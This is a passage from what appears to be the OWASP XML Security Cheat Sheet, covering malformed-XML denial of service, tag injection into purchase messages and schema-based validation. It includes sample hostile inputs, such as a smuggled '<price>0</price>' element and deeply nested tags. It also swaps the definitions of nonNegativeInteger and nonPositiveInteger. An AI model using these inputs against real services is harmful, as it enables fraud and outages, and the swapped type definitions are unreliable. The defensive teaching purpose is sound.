    Document without Schema
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#unrestrictive-schema" class="md-nav__link">
    Unrestrictive Schema
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#improper-data-validation" class="md-nav__link">
    Improper Data Validation
  </a>
  
    <nav class="md-nav" aria-label="Improper Data Validation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#string-data-types" class="md-nav__link">
    String Data Types
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#numeric-data-types" class="md-nav__link">
    Numeric Data Types
  </a>
  
    <nav class="md-nav" aria-label="Numeric Data Types">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#negative-and-positive-restrictions" class="md-nav__link">
    Negative and Positive Restrictions
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#divide-by-zero" class="md-nav__link">
    Divide by Zero
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#special-values-infinity-and-not-a-number-nan" class="md-nav__link">
    Special Values: Infinity and Not a Number (NaN)
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#general-data-restrictions" class="md-nav__link">
    General Data Restrictions
  </a>
  
    <nav class="md-nav" aria-label="General Data Restrictions">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#prefixed-values" class="md-nav__link">
    Prefixed Values
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ranges" class="md-nav__link">
    Ranges
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#patterns" class="md-nav__link">
    Patterns
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#assertions" class="md-nav__link">
    Assertions
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#occurrences" class="md-nav__link">
    Occurrences
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#jumbo-payloads" class="md-nav__link">
    Jumbo Payloads
  </a>
  
    <nav class="md-nav" aria-label="Jumbo Payloads">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#traditional-jumbo-payloads" class="md-nav__link">
    Traditional Jumbo Payloads
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#small-jumbo-payloads" class="md-nav__link">
    "Small" Jumbo Payloads
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#schema-poisoning" class="md-nav__link">
    Schema Poisoning
  </a>
  
    <nav class="md-nav" aria-label="Schema Poisoning">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#local-schema-poisoning" class="md-nav__link">
    Local Schema Poisoning
  </a>
  
    <nav class="md-nav" aria-label="Local Schema Poisoning">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#embedded-schema" class="md-nav__link">
    Embedded Schema
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#incorrect-permissions" class="md-nav__link">
    Incorrect Permissions
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remote-schema-poisoning" class="md-nav__link">
    Remote Schema Poisoning
  </a>
  
    <nav class="md-nav" aria-label="Remote Schema Poisoning">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#man-in-the-middle-mitm-attack" class="md-nav__link">
    Man-in-the-Middle (MitM) Attack
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dns-cache-poisoning" class="md-nav__link">
    DNS-Cache Poisoning
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#evil-employee-attack" class="md-nav__link">
    Evil Employee Attack
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xml-entity-expansion" class="md-nav__link">
    XML Entity Expansion
  </a>
  
    <nav class="md-nav" aria-label="XML Entity Expansion">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sample-vulnerable-java-implementations" class="md-nav__link">
    Sample Vulnerable Java Implementations
  </a>
  
    <nav class="md-nav" aria-label="Sample Vulnerable Java Implementations">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#xxe-using-dom" class="md-nav__link">
    XXE using DOM
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xxe-using-dom4j" class="md-nav__link">
    XXE using DOM4J
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xxe-using-sax" class="md-nav__link">
    XXE using SAX
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xxe-using-stax" class="md-nav__link">
    XXE using StAX
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#recursive-entity-reference" class="md-nav__link">
    Recursive Entity Reference
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#quadratic-blowup" class="md-nav__link">
    Quadratic Blowup
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#billion-laughs" class="md-nav__link">
    Billion Laughs
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reflected-file-retrieval" class="md-nav__link">
    Reflected File Retrieval
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#server-side-request-forgery" class="md-nav__link">
    Server Side Request Forgery
  </a>
  
    <nav class="md-nav" aria-label="Server Side Request Forgery">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#external-dns-resolution" class="md-nav__link">
    External DNS Resolution
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#external-connection" class="md-nav__link">
    External Connection
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-retrieval-with-parameter-entities" class="md-nav__link">
    File Retrieval with Parameter Entities
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#port-scanning" class="md-nav__link">
    Port Scanning
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#brute-forcing" class="md-nav__link">
    Brute Forcing
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                <h1 id="xml-security-cheat-sheet">XML Security Cheat Sheet<a class="headerlink" href="#xml-security-cheat-sheet" title="Permanent link">&para;</a></h1>
<h2 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">&para;</a></h2>
<p>Specifications for XML and XML schemas include multiple security flaws. At the same time, these specifications provide the tools required to protect XML applications. Even though we use XML schemas to define the security of XML documents, they can be used to perform a variety of attacks: file retrieval, server side request forgery, port scanning, or brute forcing. This cheat sheet exposes how to exploit the different possibilities in libraries and software divided in two sections:</p>
<ul>
<li><strong>Malformed XML Documents</strong>: vulnerabilities using not well formed documents.</li>
<li><strong>Invalid XML Documents</strong>: vulnerabilities using documents that do not have the expected structure.</li>
</ul>
<h2 id="malformed-xml-documents">Malformed XML Documents<a class="headerlink" href="#malformed-xml-documents" title="Permanent link">&para;</a></h2>
<p>The W3C XML specification defines a set of principles that XML documents must follow to be considered well formed. When a document violates any of these principles, it must be considered a fatal error and the data it contains is considered malformed. Multiple tactics will cause a malformed document: removing an ending tag, rearranging the order of elements into a nonsensical structure, introducing forbidden characters, and so on. The XML parser should stop execution once detecting a fatal error. The document should not undergo any additional processing, and the application should display an error message.</p>
<p>The recommendation to avoid these vulnerabilities are to use an XML processor that follows W3C specifications and does not take significant additional time to process malformed documents. In addition, use only well-formed documents and validate the contents of each element and attribute to process only valid values within predefined boundaries.</p>
<h3 id="more-time-required">More Time Required<a class="headerlink" href="#more-time-required" title="Permanent link">&para;</a></h3>
<p>A malformed document may affect the consumption of Central Processing Unit (CPU) resources. In certain scenarios, the amount of time required to process malformed documents may be greater than that required for well-formed documents. When this happens, an attacker may exploit an asymmetric resource consumption attack to take advantage of the greater processing time to cause a Denial of Service (DoS).</p>
<p>To analyze the likelihood of this attack, analyze the time taken by a regular XML document vs the time taken by a malformed version of that same document. Then, consider how an attacker could use this vulnerability in conjunction with an XML flood attack using multiple documents to amplify the effect.</p>
<h3 id="applications-processing-malformed-data">Applications Processing Malformed Data<a class="headerlink" href="#applications-processing-malformed-data" title="Permanent link">&para;</a></h3>
<p>Certain XML parsers have the ability to recover malformed documents. They can be instructed to try their best to return a valid tree with all the content that they can manage to parse, regardless of the document's noncompliance with the specifications. Since there are no predefined rules for the recovery process, the approach and results may not always be the same. Using malformed documents might lead to unexpected issues related to data integrity.</p>
<p>The following two scenarios illustrate attack vectors a parser will analyze in recovery mode:</p>
<h4 id="malformed-document-to-malformed-document">Malformed Document to Malformed Document<a class="headerlink" href="#malformed-document-to-malformed-document" title="Permanent link">&para;</a></h4>
<p>According to the XML specification, the string <code>--</code> (double-hyphen) must not occur within comments. Using the recovery mode of lxml and PHP, the following document will remain the same after being recovered:</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;element&gt;</span>
 <span class="c">&lt;!-- one</span>
<span class="c">  &lt;!-- another comment</span>
<span class="c"> comment --&gt;</span>
<span class="nt">&lt;/element&gt;</span>
</code></pre></div>

<h4 id="well-formed-document-to-well-formed-document-normalized">Well-Formed Document to Well-Formed Document Normalized<a class="headerlink" href="#well-formed-document-to-well-formed-document-normalized" title="Permanent link">&para;</a></h4>
<p>Certain parsers may consider normalizing the contents of your <code>CDATA</code> sections. This means that they will update the special characters contained in the <code>CDATA</code> section to contain the safe versions of these characters even though is not required:</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;element&gt;</span>
 <span class="cp">&lt;![CDATA[&lt;script&gt;a=1;&lt;/script&gt;]]&gt;</span>
<span class="nt">&lt;/element&gt;</span>
</code></pre></div>

<p>Normalization of a <code>CDATA</code> section is not a common rule among parsers. Libxml could transform this document to its canonical version, but although well formed, its contents may be considered malformed depending on the situation:</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;element&gt;</span>
 <span class="ni">&amp;lt;</span>script<span class="ni">&amp;gt;</span>a=1;<span class="ni">&amp;lt;</span>/script<span class="ni">&amp;gt;</span>
<span class="nt">&lt;/element&gt;</span>
</code></pre></div>

<h3 id="coercive-parsing">Coercive Parsing<a class="headerlink" href="#coercive-parsing" title="Permanent link">&para;</a></h3>
<p>A coercive attack in XML involves parsing deeply nested XML documents without their corresponding ending tags. The idea is to make the victim use up -and eventually deplete- the machine's resources and cause a denial of service on the target. Reports of a DoS attack in Firefox 3.67 included the use of 30,000 open XML elements without their corresponding ending tags. Removing the closing tags simplified the attack since it requires only half of the size of a well-formed document to accomplish the same results. The number of tags being processed eventually caused a stack overflow. A simplified version of such a document would look like this:</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;A1&gt;</span>
 <span class="nt">&lt;A2&gt;</span>
  <span class="nt">&lt;A3&gt;</span>
   ...
    <span class="nt">&lt;A30000&gt;</span>
</code></pre></div>

<h3 id="violation-of-xml-specification-rules">Violation of XML Specification Rules<a class="headerlink" href="#violation-of-xml-specification-rules" title="Permanent link">&para;</a></h3>
<p>Unexpected consequences may result from manipulating documents using parsers that do not follow W3C specifications. It may be possible to achieve crashes and/or code execution when the software does not properly verify how to handle incorrect XML structures. Feeding the software with fuzzed XML documents may expose this behavior.</p>
<h2 id="invalid-xml-documents">Invalid XML Documents<a class="headerlink" href="#invalid-xml-documents" title="Permanent link">&para;</a></h2>
<p>Attackers may introduce unexpected values in documents to take advantage of an application that does not verify whether the document contains a valid set of values. Schemas specify restrictions that help identify whether documents are valid. A valid document is well formed and complies with the restrictions of a schema, and more than one schema can be used to validate a document. These restrictions may appear in multiple files, either using a single schema language or relying on the strengths of the different schema languages.</p>
<p>The recommendation to avoid these vulnerabilities is that each XML document must have a precisely defined XML Schema (not <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>) with every piece of information properly restricted to avoid problems of improper data validation. Use a local copy or a known good repository instead of the schema reference supplied in the XML document. Also, perform an integrity check of the XML schema file being referenced, bearing in mind the possibility that the repository could be compromised. In cases where the XML documents are using remote schemas, configure servers to use only secure, encrypted communications to prevent attackers from eavesdropping on network traffic.</p>
<h3 id="document-without-schema">Document without Schema<a class="headerlink" href="#document-without-schema" title="Permanent link">&para;</a></h3>
<p>Consider a bookseller that uses a web service through a web interface to make transactions. The XML document for transactions is composed of two elements: an <code>id</code> value related to an item and a certain <code>price</code>. The user may only introduce a certain <code>id</code> value using the web interface:</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;buy&gt;</span>
 <span class="nt">&lt;id&gt;</span>123<span class="nt">&lt;/id&gt;</span>
 <span class="nt">&lt;price&gt;</span>10<span class="nt">&lt;/price&gt;</span>
<span class="nt">&lt;/buy&gt;</span>
</code></pre></div>

<p>If there is no control on the document's structure, the application could also process different well-formed messages with unintended consequences. The previous document could have contained additional tags to affect the behavior of the underlying application processing its contents:</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;buy&gt;</span>
 <span class="nt">&lt;id&gt;</span>123<span class="nt">&lt;/id&gt;&lt;price&gt;</span>0<span class="nt">&lt;/price&gt;&lt;id&gt;&lt;/id&gt;</span>
 <span class="nt">&lt;price&gt;</span>10<span class="nt">&lt;/price&gt;</span>
<span class="nt">&lt;/buy&gt;</span>
</code></pre></div>

<p>Notice again how the value 123 is supplied as an <code>id</code>, but now the document includes additional opening and closing tags. The attacker closed the <code>id</code> element and sets a bogus <code>price</code> element to the value 0. The final step to keep the structure well-formed is to add one empty <code>id</code> element. After this, the application adds the closing tag for <code>id</code> and set the <code>price</code> to 10. If the application processes only the first values provided for the ID and the value without performing any type of control on the structure, it could benefit the attacker by providing the ability to buy a book without actually paying for it.</p>
<h3 id="unrestrictive-schema">Unrestrictive Schema<a class="headerlink" href="#unrestrictive-schema" title="Permanent link">&para;</a></h3>
<p>Certain schemas do not offer enough restrictions for the type of data that each element can receive. This is what normally happens when using <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>; it has a very limited set of possibilities compared to the type of restrictions that can be applied in XML documents. This could expose the application to undesired values within elements or attributes that would be easy to constrain when using other schema languages. In the following example, a person's <code>age</code> is validated against an inline <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> schema:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;!DOCTYPE person [</span>
<span class="cp"> &lt;!ELEMENT person (name, age)&gt;</span>
 <span class="cp">&lt;!ELEMENT name (#PCDATA)&gt;</span>
 <span class="cp">&lt;!ELEMENT age (#PCDATA)&gt;</span>
]&gt;
<span class="nt">&lt;person&gt;</span>
 <span class="nt">&lt;name&gt;</span>John Doe<span class="nt">&lt;/name&gt;</span>
 <span class="nt">&lt;age&gt;</span>11111..(1.000.000digits)..11111<span class="nt">&lt;/age&gt;</span>
<span class="nt">&lt;/person&gt;</span>
</code></pre></div>

<p>The previous document contains an inline <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> with a root element named <code>person</code>. This element contains two elements in a specific order: <code>name</code> and then <code>age</code>. The element <code>name</code> is then defined to contain <code>PCDATA</code> as well as the element <code>age</code>. After this definition begins the well-formed and valid XML document. The element name contains an irrelevant value but the <code>age</code> element contains one million digits. Since there are no restrictions on the maximum size for the <code>age</code> element, this one-million-digit string could be sent to the server for this element. Typically this type of element should be restricted to contain no more than a certain amount of characters and constrained to a certain set of characters (for example, digits from 0 to 9, the + sign and the - sign). If not properly restricted, applications may handle potentially invalid values contained in documents. Since it is not possible to indicate specific restrictions (a maximum length for the element <code>name</code> or a valid range for the element <code>age</code>), this type of schema increases the risk of affecting the integrity and availability of resources.</p>
<h3 id="improper-data-validation">Improper Data Validation<a class="headerlink" href="#improper-data-validation" title="Permanent link">&para;</a></h3>
<p>When schemas are insecurely defined and do not provide strict rules, they may expose the application to diverse situations. The result of this could be the disclosure of internal errors or documents that hit the application's functionality with unexpected values.</p>
<h4 id="string-data-types">String Data Types<a class="headerlink" href="#string-data-types" title="Permanent link">&para;</a></h4>
<p>Provided you need to use a hexadecimal value, there is no point in defining this value as a string that will later be restricted to the specific 16 hexadecimal characters. To exemplify this scenario, when using XML encryption some values must be encoded using base64 . This is the schema definition of how these values should look:</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;element</span> <span class="na">name=</span><span class="s">&quot;CipherData&quot;</span> <span class="na">type=</span><span class="s">&quot;xenc:CipherDataType&quot;</span><span class="nt">/&gt;</span>
 <span class="nt">&lt;complexType</span> <span class="na">name=</span><span class="s">&quot;CipherDataType&quot;</span><span class="nt">&gt;</span>
  <span class="nt">&lt;choice&gt;</span>
   <span class="nt">&lt;element</span> <span class="na">name=</span><span class="s">&quot;CipherValue&quot;</span> <span class="na">type=</span><span class="s">&quot;base64Binary&quot;</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;element</span> <span class="na">ref=</span><span class="s">&quot;xenc:CipherReference&quot;</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;/choice&gt;</span>
 <span class="nt">&lt;/complexType&gt;</span>
</code></pre></div>

<p>The previous schema defines the element <code>CipherValue</code> as a base64 data type. As an example, the IBM WebSphere DataPower SOA Appliance allowed any type of characters within this element after a valid base64 value, and will consider it valid. The first portion of this data is properly checked as a base64 value, but the remaining characters could be anything else (including other sub-elements of the <code>CipherData</code> element). Restrictions are partially set for the element, which means that the information is probably tested using an application instead of the proposed sample schema.</p>
<h4 id="numeric-data-types">Numeric Data Types<a class="headerlink" href="#numeric-data-types" title="Permanent link">&para;</a></h4>
<p>Defining the correct data type for numbers can be more complex since there are more options than there are for strings.</p>
<h5 id="negative-and-positive-restrictions">Negative and Positive Restrictions<a class="headerlink" href="#negative-and-positive-restrictions" title="Permanent link">&para;</a></h5>
<p>XML Schema numeric data types can include different ranges of numbers. They could include:</p>
<ul>
<li><strong>negativeInteger</strong>: Only negative numbers</li>
<li><strong>nonNegativeInteger</strong>: Negative numbers and the zero value</li>
<li><strong>positiveInteger</strong>: Only positive numbers</li>
<li><strong>nonPositiveInteger</strong>: Positive numbers and the zero value</li>
</ul>
<p>The following sample document defines an <code>id</code> for a product, a <code>price</code>, and a <code>quantity</code> value that is under the control of an attacker:</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;buy&gt;</span>
 <span class="nt">&lt;id&gt;</span>1<span class="nt">&lt;/id&gt;</span>
 <span class="nt">&lt;price&gt;</span>10<span class="nt">&lt;/price&gt;</span>
 <span class="nt">&lt;quantity&gt;</span>1<span class="nt">&lt;/quantity&gt;</span>
<span class="nt">&lt;/buy&gt;</span>
</code></pre></div>

<p>To avoid repeating old errors, an XML schema may be defined to prevent processing the incorrect structure in cases where an attacker wants to introduce additional elements:</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;xs:schema</span> <span class="na">xmlns:xs=</span><span class="s">&quot;http://www.w3.org/2001/XMLSchema&quot;</span><span class="nt">&gt;</span>
 <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;buy&quot;</span><span class="nt">&gt;</span>
  <span class="nt">&lt;xs:complexType&gt;</span>
   <span class="nt">&lt;xs:sequence&gt;</span>
    <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;id&quot;</span> <span class="na">type=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;price&quot;</span> <span class="na">type=</span><span class="s">&quot;xs:decimal&quot;</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;quantity&quot;</span> <span class="na">type=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;/xs:sequence&gt;</span>
  <span class="nt">&lt;/xs:complexType&gt;</span>
 <span class="nt">&lt;/xs:element&gt;</span>
<span class="nt">&lt;/xs:schema&gt;</span>
</code></pre></div>

<p>Limiting that <code>quantity</code> to an integer data type will avoid any unexpected characters. Once the application receives the previous message, it may calculate the final price by doing <code>price*quantity</code>. However, since this data type may allow negative values, it might allow a negative result on the user's account if an attacker provides a negative number. What you probably want to see in here to avoid that logical vulnerability is positiveInteger instead of integer.</p>
<h5 id="divide-by-zero">Divide by Zero<a class="headerlink" href="#divide-by-zero" title="Permanent link">&para;</a></h5>
<p>Whenever using user controlled values as denominators in a division, developers should avoid allowing the number zero. In cases where the value zero is used for division in XSLT, the error <code>FOAR0001</code> will occur. Other applications may throw other exceptions and the program may crash. There are specific data types for XML schemas that specifically avoid using the zero value. For example, in cases where negative values and zero are not considered valid, the schema could specify the data type <code>positiveInteger</code> for the element.</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;denominator&quot;</span><span class="nt">&gt;</span>
 <span class="nt">&lt;xs:simpleType&gt;</span>
  <span class="nt">&lt;xs:restriction</span> <span class="na">base=</span><span class="s">&quot;xs:positiveInteger&quot;</span><span class="nt">/&gt;</span>
 <span class="nt">&lt;/xs:simpleType&gt;</span>
<span class="nt">&lt;/xs:element&gt;</span>
</code></pre></div>

<p>The element <code>denominator</code> is now restricted to positive integers. This means that only values greater than zero will be considered valid. If you see any other type of restriction being used, you may trigger an error if the denominator is zero.</p>
<h5 id="special-values-infinity-and-not-a-number-nan">Special Values: Infinity and Not a Number (NaN)<a class="headerlink" href="#special-values-infinity-and-not-a-number-nan" title="Permanent link">&para;</a></h5>
<p>The data types <code>float</code> and <code>double</code> contain real numbers and some special values: <code>-Infinity</code> or <code>-INF</code>, <code>NaN</code>, and <code>+Infinity</code> or <code>INF</code>. These possibilities may be useful to express certain values, but they are sometimes misused. The problem is that they are commonly used to express only real numbers such as prices. This is a common error seen in other programming languages, not solely restricted to these technologies. Not considering the whole spectrum of possible values for a data type could make underlying applications fail. If the special values <code>Infinity</code> and <code>NaN</code> are not required and only real numbers are expected, the data type <code>decimal</code> is recommended:</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;xs:schema</span> <span class="na">xmlns:xs=</span><span class="s">&quot;http://www.w3.org/2001/XMLSchema&quot;</span><span class="nt">&gt;</span>
 <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;buy&quot;</span><span class="nt">&gt;</span>
  <span class="nt">&lt;xs:complexType&gt;</span>
   <span class="nt">&lt;xs:sequence&gt;</span>
    <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;id&quot;</span> <span class="na">type=</span><span class="s">&quot;xs:integer&quot;</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;price&quot;</span> <span class="na">type=</span><span class="s">&quot;xs:decimal&quot;</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;quantity&quot;</span> <span class="na">type=</span><span class="s">&quot;xs:positiveInteger&quot;</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;/xs:sequence&gt;</span>
  <span class="nt">&lt;/xs:complexType&gt;</span>
 <span class="nt">&lt;/xs:element&gt;</span>
<span class="nt">&lt;/xs:schema&gt;</span>
</code></pre></div>

<p>The price value will not trigger any errors when set at Infinity or NaN, because these values will not be valid. An attacker can exploit this issue if those values are allowed.</p>
<h4 id="general-data-restrictions">General Data Restrictions<a class="headerlink" href="#general-data-restrictions" title="Permanent link">&para;</a></h4>
<p>After selecting the appropriate data type, developers may apply additional restrictions. Sometimes only a certain subset of values within a data type will be considered valid:</p>
<h5 id="prefixed-values">Prefixed Values<a class="headerlink" href="#prefixed-values" title="Permanent link">&para;</a></h5>
<p>Certain types of values should only be restricted to specific sets: traffic lights will have only three types of colors, only 12 months are available, and so on. It is possible that the schema has these restrictions in place for each element or attribute. This is the most perfect whitelist scenario for an application: only specific values will be accepted. Such a constraint is called <code>enumeration</code> in XML schema. The following example restricts the contents of the element month to 12 possible values:</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;month&quot;</span><span class="nt">&gt;</span>
 <span class="nt">&lt;xs:simpleType&gt;</span>
  <span class="nt">&lt;xs:restriction</span> <span class="na">base=</span><span class="s">&quot;xs:string&quot;</span><span class="nt">&gt;</span>
   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">&quot;January&quot;</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">&quot;February&quot;</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">&quot;March&quot;</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">&quot;April&quot;</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">&quot;May&quot;</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">&quot;June&quot;</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">&quot;July&quot;</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">&quot;August&quot;</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">&quot;September&quot;</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">&quot;October&quot;</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">&quot;November&quot;</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">&quot;December&quot;</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;/xs:restriction&gt;</span>
 <span class="nt">&lt;/xs:simpleType&gt;</span>
<span class="nt">&lt;/xs:element&gt;</span>
</code></pre></div>

<p>By limiting the month element's value to any of the previous values, the application will not be manipulating random strings.</p>
<h5 id="ranges">Ranges<a class="headerlink" href="#ranges" title="Permanent link">&para;</a></h5>
<p>Software applications, databases, and programming languages normally store information within specific ranges. Whenever using an element or an attribute in locations where certain specific sizes matter (to avoid overflows or underflows), it would be logical to check whether the data length is considered valid. The following schema could constrain a name using a minimum and a maximum length to avoid unusual scenarios:</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;name&quot;</span><span class="nt">&gt;</span>
 <span class="nt">&lt;xs:simpleType&gt;</span>
  <span class="nt">&lt;xs:restriction</span> <span class="na">base=</span><span class="s">&quot;xs:string&quot;</span><span class="nt">&gt;</span>
   <span class="nt">&lt;xs:minLength</span> <span class="na">value=</span><span class="s">&quot;3&quot;</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;xs:maxLength</span> <span class="na">value=</span><span class="s">&quot;256&quot;</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;/xs:restriction&gt;</span>
 <span class="nt">&lt;/xs:simpleType&gt;</span>
<span class="nt">&lt;/xs:element&gt;</span>
</code></pre></div>

<p>In cases where the possible values are restricted to a certain specific length (let's say 8), this value can be specified as follows to be valid:</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;name&quot;</span><span class="nt">&gt;</span>
 <span class="nt">&lt;xs:simpleType&gt;</span>
  <span class="nt">&lt;xs:restriction</span> <span class="na">base=</span><span class="s">&quot;xs:string&quot;</span><span class="nt">&gt;</span>
   <span class="nt">&lt;xs:length</span> <span class="na">value=</span><span class="s">&quot;8&quot;</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;/xs:restriction&gt;</span>
 <span class="nt">&lt;/xs:simpleType&gt;</span>
<span class="nt">&lt;/xs:element&gt;</span>
</code></pre></div>

<h5 id="patterns">Patterns<a class="headerlink" href="#patterns" title="Permanent link">&para;</a></h5>
<p>Certain elements or attributes may follow a specific syntax. You can add <code>pattern</code> restrictions when using XML schemas. When you want to ensure that the data complies with a specific pattern, you can create a specific definition for it. Social security numbers (SSN) may serve as a good example; they must use a specific set of characters, a specific length, and a specific <code>pattern</code>:</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">&quot;SSN&quot;</span><span class="nt">&gt;</span>
 <span class="nt">&lt;xs:simpleType&gt;</span>
  <span class="nt">&lt;xs:restriction</span> <span class="na">base=</span><span class="s">&quot;xs:token&quot;</span><span class="nt">&gt;</span>
   <span class="nt">&lt;xs:pattern</span> <span class="na">value=</span><span class="s">&quot;[0-9]{3}-[0-9]{2}-[0-9]{4}&quot;</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;/xs:restriction&gt;</span>
 <span class="nt">&lt;/xs:simpleType&gt;</span>
<span class="nt">&lt;/xs:element&gt;</span>
</code></pre></div>

<p>Only numbers between <code>000-00-0000</code> and <code>999-99-9999</code> will be allowed as values for a SSN.</p>
<h5 id="assertions">Assertions<a class="headerlink" href="#assertions" title="Permanent link">&para;</a></h5>
<p>Assertion components constrain the existence and values of related elements and attributes on XML schemas. An element or attribute will be considered valid with regard to an assertion only if the test evaluates to true without raising any error. The variable <code>$value</code> can be used to reference the contents of the value being analyzed. The <em>Divide by Zero</em> section above referenced the potential consequences of using data types containing the zero value for denominators, proposing a data type containing only positive values. An opposite example would consider valid the entire range of numbers except zero. To avoid disclosing potential errors, values could be checked using an <code>assertion</code> disallowing the number zero:</p>
